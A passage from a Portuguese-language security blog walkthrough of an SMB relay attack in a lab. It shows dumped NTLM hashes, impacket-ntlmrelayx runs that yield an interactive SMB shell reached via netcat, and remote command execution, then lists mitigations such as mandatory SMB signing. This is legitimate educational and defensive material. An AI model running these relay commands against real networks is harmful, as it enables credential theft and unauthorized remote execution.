WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9ebbbaa98c9ab926aae0a26b1a7945ca:::
test:1003:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Done dumping SAM hashes for host: 192.168.0.102
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
[*] SMBD-Thread-9 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left!
</code></pre><h3 id=_shell_-interactiva><em>Shell</em> Interactiva<a hidden class=anchor aria-hidden=true href=#_shell_-interactiva>#</a></h3><p>Com a opção -i <em>(interactive)</em> a ferramenta cria uma <em>reverse shell</em> que poderemos aceder atraves da nossa maquina.</p><p>** [*] Started interactive SMB client shell via TCP on 127.0.0.1:11000 **</p><pre tabindex=0><code class=language-terminal data-lang=terminal>┌──(kali㉿insecure)-[~]
└─$ impacket-ntlmrelayx -t 192.168.0.102 -smb2support -i
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.0.101, attacking target smb://192.168.0.102
[*] Authenticating against smb://192.168.0.102 as INSECURE/JCID SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left!
[*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left!
</code></pre><p>Para tal basta abrir uma sessão com <em>netcat</em> para o IP/Porto que a nossa sessão está estabecida.</p><pre tabindex=0><code class=language-terminal data-lang=terminal>
┌──(kali㉿insecure)-[~]
└─$ nc -nv 127.0.0.1 11000
(UNKNOWN) [127.0.0.1] 11000 (?) open
Type help for list of commands
# ?

 open {host,port=445} - opens a SMB connection against the target host/port
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it&#39;ll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it&#39;ll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)
</code></pre><p>É possivel ainda enviar commandos, o exemplo abaixo mostra o <em>output</em> mas na prática até nos possivel enviar <em>oneliners</em> para criação de uma <em>reverse shell</em>.</p><pre tabindex=0><code class=language-terminal data-lang=terminal>
└─$ impacket-ntlmrelayx -t 192.168.0.102 -smb2support -c &#34;whoami /priv&#34;
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.0.101, attacking target smb://192.168.0.102
[*] Authenticating against smb://192.168.0.102 as INSECURE/JCID SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left!
[*] Executed specified command on host: 192.168.0.102

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
[*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left!
</code></pre><h1 id=mitigação>Mitigação<a hidden class=anchor aria-hidden=true href=#mitigação>#</a></h1><h2 id=habititar-smb-signing-como-obrigatório>Habititar SMB Signing como obrigatório.<a hidden class=anchor aria-hidden=true href=#habititar-smb-signing-como-obrigatório>#</a></h2><p>Pode ser feito por GPO para toda a organização, devemos ter em conta que esta configuração poderá criar latência em cerca de 50% na transferência de ficheiros.</p><p><a href=https://www.rootusers.com/configure-smb-signing-via-group-policy/>https://www.rootusers.com/configure-smb-signing-via-group-policy/</a></p><h2 id=account-_tiering_>Account <em>Tiering</em><a hidden class=anchor aria-hidden=true href=#account-_tiering_>#</a></h2><p>Garantir que os utilizadors dependendo da seu nivel de acesso só acedem a servidores especificos e não permitir que os utilizadores sejam <em>local admins</em> das suas máquinas.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://www.insecure.pt/tags/active-directory/>Active Directory</a></li><li><a href=https://www.insecure.pt/tags/poisoning-spoofing/>Poisoning & Spoofing</a></li><li><a href=https://www.insecure.pt/tags/ntlmv2/>NTLMV2</a></li><li><a href=https://www.insecure.pt/tags/mitm/>MITM</a></li><li><a href=https://www.insecure.pt/tags/smb/>SMB</a></li></ul><nav class=paginav><a class=prev href=https://www.insecure.pt/posts/tools/powerview/><span class=title>« Prev</span><br><span>Powerview</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share SMB Relay Attack on twitter" href="https://twitter.com/intent/tweet/?text=SMB%20Relay%20Attack&url=https%3a%2f%2fwww.insecure.pt%2fposts%2fad_smbrelay%2f&hashtags=ActiveDirectory%2cPoisoning%26Spoofing%2cNTLMV2%2cMITM%2cSMB"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SMB Relay Attack on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fwww.insecure.pt%2fposts%2fad_smbrelay%2f&title=SMB%20Relay%20Attack&summary=SMB%20Relay%20Attack&source=https%3a%2f%2fwww.insecure.pt%2fposts%2fad_smbrelay%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SMB Relay Attack on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fwww.insecure.pt%2fposts%2fad_smbrelay%2f&title=SMB%20Relay%20Attack"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SMB Relay Attack on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fwww.insecure.pt%2fposts%2fad_smbrelay%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SMB Relay Attack on whatsapp" href="https://api.whatsapp.com/send?text=SMB%20Relay%20Attack%20-%20https%3a%2f%2fwww.insecure.pt%2fposts%2fad_smbrelay%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SMB Relay Attack on telegram" href="https://telegram.me/share/url?text=SMB%20Relay%20Attack&url=https%3a%2f%2fwww.insecure.pt%2fposts%2fad_smbrelay%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://www.insecure.pt/>{in}secure</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>